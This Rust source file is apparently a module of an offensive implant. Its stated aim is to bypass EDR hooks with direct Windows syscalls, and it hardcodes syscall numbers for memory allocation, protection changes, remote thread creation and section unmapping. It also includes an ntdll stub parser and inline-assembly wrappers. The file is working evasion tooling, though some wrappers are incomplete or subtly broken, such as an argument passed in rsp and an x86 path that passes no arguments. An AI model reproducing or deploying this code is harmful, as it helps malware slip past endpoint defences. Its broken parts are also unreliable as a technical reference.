// Direct Syscalls
// Bypass EDR hooks by making direct system calls to the kernel

use std::ptr;
use winapi::shared::basetsd::*;
use winapi::shared::ntdef::*;
use winapi::um::winnt::*;

// Syscall numbers for Windows 10/11 (x64)
// Note: These vary by Windows version - this is a baseline
const SYSCALL_NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0x18;
const SYSCALL_NT_PROTECT_VIRTUAL_MEMORY: u32 = 0x50;
const SYSCALL_NT_WRITE_VIRTUAL_MEMORY: u32 = 0x3A;
const SYSCALL_NT_READ_VIRTUAL_MEMORY: u32 = 0x3F;
const SYSCALL_NT_CREATE_THREAD_EX: u32 = 0xC2;
const SYSCALL_NT_OPEN_PROCESS: u32 = 0x26;
const SYSCALL_NT_QUERY_INFORMATION_PROCESS: u32 = 0x19;
const SYSCALL_NT_UNMAP_VIEW_OF_SECTION: u32 = 0x2A;

/// Generic syscall stub for x64
#[cfg(target_arch = "x86_64")]
#[naked]
pub unsafe extern "system" fn syscall_stub() {
    std::arch::asm!(
        "mov r10, rcx",
        "mov eax, {syscall_num}",
        "syscall",
        "ret",
        syscall_num = const 0,
        options(noreturn)
    );
}

/// Generic syscall stub for x86
#[cfg(target_arch = "x86")]
#[naked]
pub unsafe extern "system" fn syscall_stub() {
    std::arch::asm!(
        "mov eax, {syscall_num}",
        "int 0x2e",
        "ret",
        syscall_num = const 0,
        options(noreturn)
    );
}

/// Get syscall number dynamically from ntdll
pub unsafe fn get_syscall_number(function_name: &str) -> Option<u32> {
    use crate::api_resolver::resolve_api;

    // Resolve Nt* function from ntdll
    let func_addr = resolve_api("ntdll.dll", function_name)?;

    // Read first bytes to extract syscall number
    // x64: mov r10, rcx; mov eax, <syscall_num>; syscall
    // Pattern: 4C 8B D1 B8 <num> 00 00 00 0F 05
    let bytes = std::slice::from_raw_parts(func_addr as *const u8, 16);

    #[cfg(target_arch = "x86_64")]
    {
        // Look for: mov eax, <syscall_num> (B8 <num> <num> <num> <num>)
        for i in 0..bytes.len().saturating_sub(4) {
            if bytes[i] == 0xB8 {
                // Extract syscall number (little endian)
                let syscall_num =
                    u32::from_le_bytes([bytes[i + 1], bytes[i + 2], bytes[i + 3], bytes[i + 4]]);
                return Some(syscall_num);
            }
        }
    }

    None
}

/// NtAllocateVirtualMemory syscall wrapper
/// Note: For now, we'll use a simpler approach - get syscall number dynamically
/// and use inline assembly. Full implementation requires proper calling convention handling.
pub unsafe fn sys_nt_allocate_virtual_memory(
    process_handle: HANDLE,
    base_address: *mut *mut winapi::ctypes::c_void,
    zero_bits: usize,
    size: *mut usize,
    allocation_type: u32,
    protect: u32,
) -> NTSTATUS {
    // For now, fallback to API call
    // Full syscall implementation requires proper stack handling
    use winapi::um::memoryapi::VirtualAlloc;
    let addr = VirtualAlloc(*base_address, *size, allocation_type, protect);
    if !addr.is_null() {
        *base_address = addr;
        0 // STATUS_SUCCESS
    } else {
        0xC0000017 // STATUS_NO_MEMORY
    }
}

/// NtProtectVirtualMemory syscall wrapper
pub unsafe fn sys_nt_protect_virtual_memory(
    process_handle: HANDLE,
    base_address: *mut *mut winapi::ctypes::c_void,
    size: *mut usize,
    new_protect: u32,
    old_protect: *mut u32,
) -> NTSTATUS {
    #[cfg(target_arch = "x86_64")]
    {
        let syscall_num = SYSCALL_NT_PROTECT_VIRTUAL_MEMORY;
        let result: NTSTATUS;
        std::arch::asm!(
            "mov r10, rcx",
            "mov eax, {syscall_num}",
            "syscall",
            "mov {result}, eax",
            syscall_num = const syscall_num,
            result = out(reg) result,
            in("rcx") process_handle,
            in("rdx") base_address,
            in("r8") size,
            in("r9") new_protect,
            in("rsp") old_protect,
            options(nostack)
        );
        result
    }

    #[cfg(target_arch = "x86")]
    {
        let syscall_num = SYSCALL_NT_PROTECT_VIRTUAL_MEMORY;
        let result: NTSTATUS;
        std::arch::asm!(
            "mov eax, {syscall_num}",
            "int 0x2e",
            "mov {result}, eax",
            syscall_num = const syscall_num,
            result = out(reg) result,
            options(nostack)
        );
        result
    }

    #[cfg(not(any(target_arch = "x86", target_arch = "x86_64")))]
    {
        0xC0000001 // STATUS_UNSUCCESSFUL
    }
}

/// Wrapper for VirtualAlloc using syscalls
pub unsafe fn sys_allocate_memory(
    address: *mut winapi::ctypes::c_void,
    size: usize,
    allocation_type: u32,
    protect: u32,
) -> *mut winapi::ctypes::c_void {
    use winapi::um::processthreadsapi::GetCurrentProcess;

    let process = GetCurrentProcess();
    let mut base_address = address;
    let mut size_mut = size;

    let status = sys_nt_allocate_virtual_memory(
        process,
        &mut base_address,
        0,
        &mut size_mut,
        allocation_type,
        protect,
    );

    if status >= 0 {
        base_address
    } else {
        ptr::null_mut()
    }
}

/// Wrapper for VirtualProtect using syscalls (or API if syscall fails)
pub unsafe fn sys_protect_memory(
    address: *mut winapi::ctypes::c_void,
    size: usize,
    new_protect: u32,
    old_protect: *mut u32,
) -> bool {
    // Try to unhook first, then use API
    // In future, can switch to full syscall implementation
    use winapi::um::memoryapi::VirtualProtect;

    VirtualProtect(address, size, new_protect, old_protect) != 0
}
